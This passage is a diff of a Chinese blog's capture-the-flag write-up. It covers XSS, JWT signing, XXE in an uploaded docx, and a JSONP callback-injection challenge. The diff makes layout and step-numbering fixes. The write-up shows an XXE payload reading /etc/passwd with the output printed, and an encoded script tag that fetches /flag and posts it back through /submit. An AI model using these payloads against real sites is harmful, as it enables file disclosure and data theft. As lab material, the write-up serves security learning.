@@ -114,13 +114,13 @@ RESP 非常简单且人类可读，这使得 Redis 能够易于使用和调试�
 当攻击者发现有存储 型xss漏洞时，攻击者将恶意的跨站注入脚本写入网站的数据库中，当有人再次访问这个网页的时候就会触存储型xss，进而进行xss攻击。
 详细请看：<a href="https://blog.csdn.net/m0_66458291/article/details/135127390?ops_request_misc=elastic_search_misc&amp;request_id=5411d4d552f5206ba8e98102cef654af&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-135127390-null-null.142%5Ev102%5Epc_search_result_base2&amp;utm_term=xxs&amp;spm=1018.2226.3001.4187%E3%80%82" target="_blank">https://blog.csdn.net/m0_66458291/article/details/135127390?ops_request_misc=elastic_search_misc&amp;request_id=5411d4d552f5206ba8e98102cef654af&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-135127390-null-null.142^v102^pc_search_result_base2&amp;utm_term=xxs&amp;spm=1018.2226.3001.4187。</a></p>
 </li>
-</ol></section><section><h4>JWT<a href="#jwt"><span>#</span></a></h4><p>JWT 就是一张<strong>服务器自己盖了章的通行证</strong>，长这样：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>eyJhbGciOiJ... . eyJzdWIiOiJhZG1pbi... . NDzn5ZtVagMF...</span></div></div><div><div><div>2</div></div><div><span><span>     </span></span><span>第一段              第二段                第三段</span></div></div><div><div><div>3</div></div><div><span><span>   </span></span><span>(用什么算法算的)    (通行证上写了谁)      (盖的章/签名)</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p><strong>中间这段内容任何人都能解开看，也能随便改</strong>。它不是加密的，只是 base64 编码，跟明牌没区别。
+</ol></section><section><h4>JWT<a href="#jwt"><span>#</span></a></h4><p>JWT 就是一张<strong>服务器自己盖了章的通行证</strong>，长这样：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>eyJhbGciOiJ... . eyJzdWIiOiJhZG1pbi... . NDzn5ZtVagMF...</span></div></div><div><div><div>2</div></div><div><span><span>    </span></span><span>第一段              第二段                第三段</span></div></div><div><div><div>3</div></div><div><span><span> </span></span><span>(用什么算法算的)    (通行证上写了谁)      (盖的章/签名)</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p><strong>中间这段内容任何人都能解开看，也能随便改</strong>。它不是加密的，只是 base64 编码，跟明牌没区别。
 签票的时候，服务器做的事是：章 = 用 secret 这把”钥匙”，对“第一段.第二段”这串内容算一个哈希。访问 <code>/admin</code> 时先把输入的通行证拆开，拿第二段（role=xxx）
-然后<strong>用它手里的 secret 重新算一遍章</strong>，跟你给的第三段对一下，对得上 → 这张证是服务器发的，里面写什么服务器就信什么 → 看 role 是不是 root。</p></section><section><h4>拼包<a href="#拼包"><span>#</span></a></h4><p>按 HTTP 协议格式把内容打出来，再通过 gopher 发出去。</p></section><section><h4>Flask<a href="#flask"><span>#</span></a></h4><p>Flask 相当于是用 Python 写网站的一个 “工具箱”，作用有监听端口、解析浏览器发过来的请求、判断 “你要访问 /login 还是 /admin”、把结果返回给浏览器等。</p></section><section><h4>unquote<a href="#unquote"><span>#</span></a></h4><p><strong>unquote = “解开 URL 编码”，是个反向翻译函数</strong>。而<strong>URL 编码</strong>是把不能直接写在 URL 里的字符（空格、回车、中文、% 本身）换成 <code>%</code> 加两位十六进制数。 unquote就相当于把编码还原。</p></section><section><h4>HMAC-SHA256<a href="#hmac-sha256"><span>#</span></a></h4><ul>
+然后<strong>用它手里的 secret 重新算一遍章</strong>，跟你给的第三段对一下，对得上 → 这张证是服务器发的，里面写什么服务器就信什么 → 看 role 是不是 root。</p></section><section><h4>拼包<a href="#拼包"><span>#</span></a></h4><p>按 HTTP 协议格式把内容打出来，再通过 gopher 发出去。</p></section><section><h3>Flask<a href="#flask"><span>#</span></a></h3><p>Flask 相当于是用 Python 写网站的一个 “工具箱”，作用有监听端口、解析浏览器发过来的请求、判断 “你要访问 /login 还是 /admin”、把结果返回给浏览器等。</p><section><h4>unquote<a href="#unquote"><span>#</span></a></h4><p><strong>unquote = “解开 URL 编码”，是个反向翻译函数</strong>。而<strong>URL 编码</strong>是把不能直接写在 URL 里的字符（空格、回车、中文、% 本身）换成 <code>%</code> 加两位十六进制数。 unquote就相当于把编码还原。</p></section><section><h4>HMAC-SHA256<a href="#hmac-sha256"><span>#</span></a></h4><ul>
 <li>输入一样的内容回显一样的东西</li>
 <li>改一个字母回显出来的整个字符串就和原来的完全不一样</li>
 <li>这些孩子至少JWT前两段拼起来相当于被盖章的字符串然后真章是最后一段，这个章要用secret算，中间的是内容</li>
-</ul></section></section>
+</ul></section></section></section>
 <section><h1>WP<a href="#wp"><span>#</span></a></h1><section><h4>过期文档<a href="#过期文档"><span>#</span></a></h4><p>先看题目
 </p><figure><img alt="&gt;.&lt;" loading="lazy" width="934" height="652" src="/_astro/e38.BRkoV5gs_ZdEW7C.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
 一个很简洁的登录页面。<p></p><ol>
@@ -147,7 +147,7 @@ RESP 非常简单且人类可读，这使得 Redis 能够易于使用和调试�
 但是docx 必须仍是合法 zip，把改好的 core.xml 放到原包对应的位置。</li>
 <li>先读 /etc/passwd验证漏洞，把xxe.docx上传，页面回显：</li>
 </ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>成功提取简历作者信息：root:x:0:0:root:/root:/bin/bash</span></div></div><div><div><div>2</div></div><div><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></div></div><div><div><div>3</div></div><div><span>...</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>/etc/passwd 内容被成功读出来说明XXE 成立，本地文件读取可用。
-6. 访问/flag路径就有了，页面显示“成功提取简历作者信息：SYC{…}”。</p><blockquote><p>lxml 危险配置：resolve_entities=True + load_dtd=True 即构成 XXE；no_network=True 只禁网络实体，不禁本地 file://。</p></blockquote></section><section><h4>CloudView<a href="#cloudview"><span>#</span></a></h4><p>先看题目
+7. 访问/flag路径就有了，页面显示“成功提取简历作者信息：SYC{…}”。</p><blockquote><p>lxml 危险配置：resolve_entities=True + load_dtd=True 即构成 XXE；no_network=True 只禁网络实体，不禁本地 file://。</p></blockquote></section><section><h4>CloudView<a href="#cloudview"><span>#</span></a></h4><p>先看题目
 </p><figure><img alt="&gt;.&lt;" loading="lazy" width="1356" height="1020" src="/_astro/e37.Do2YGPHz_ZimQWJ.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
 是一个登录界面。<p></p><ol>
 <li>先看源码，没发现什么东西。</li>
@@ -183,14 +183,13 @@ RESP 非常简单且人类可读，这使得 Redis 能够易于使用和调试�
 <li>直接访问 /jsonp　探默认结构。返回 callback({…})，结果是标准 JSONP。</li>
 <li>/jsonp?callback=alert123探回调名是否反射。返回 alert123({…})，原样拼入。回调名可控。</li>
 <li>/jsonp?callback=alert(1)//　探特殊字符/代码注入。括号、引号、分号、// 全放行；// 注释掉追加 JSON。回调位可以塞任意的 JS。</li>
-<li>扫其他回显端点　找备选脚本源。除 /jsonp 外没有第二个。那就只能用 /jsonp了。</li>
+<li>扫其他回显端点　找备选脚本源。除 /jsonp 外没有第二个。那就只能用 /jsonp 了。</li>
 <li>注入一段只 fetch(‘/submit’) 发帖的 JS　验回写通道。自动建出新帖，通道可用。回写出口用 /submit。</li>
 <li><code>&lt;script/ src="/jsonp?callback=window.__probe=7//"&gt;&lt;/script/&gt;</code>　验标签绕过 + 同源加载 + JS 执行。Console 读 window.__probe 返回 7。</li>
-<li></li>
 <li>整合一下再发个帖，正文写：</li>
 </ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>&lt;script/ </span><span>src</span><span>=</span><span>"/jsonp?callback=fetch%28%27/flag%27%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3Efetch%28%27/submit%27%2C%7Bmethod%3A%27POST%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application/x-www-form-urlencoded%27%7D%2Cbody%3A%27title%3Dflag-leak%26content%3D%27%2BencodeURIComponent%28t%29%7D%29%29.catch%28e%3D%3Efetch%28%27/submit%27%2C%7Bmethod%3A%27POST%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application/x-www-form-urlencoded%27%7D%2Cbody%3A%27title%3Dflag-err%26content%3D%27%2BencodeURIComponent%28String%28e%29%29%7D%29%29//"</span><span>&gt;&lt;/script/&gt;</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>封帖。
-21. 返回原题目页面首页去查看刚刚发的帖子的原帖.
-22. 回写帖正文里读到 flag。
+20. 返回原题目页面首页去查看刚刚发的帖子的原帖.
+21. 回写帖正文里读到 flag。
 </p><figure><img alt="&gt;.&lt;" loading="lazy" width="1156" height="247" src="/_astro/e41.BcYEIH82_Z2aJqvN.webp" /><figcaption>&gt;.&lt;</figcaption></figure><p></p></section></section>]]></content>
     </entry>
     <entry>
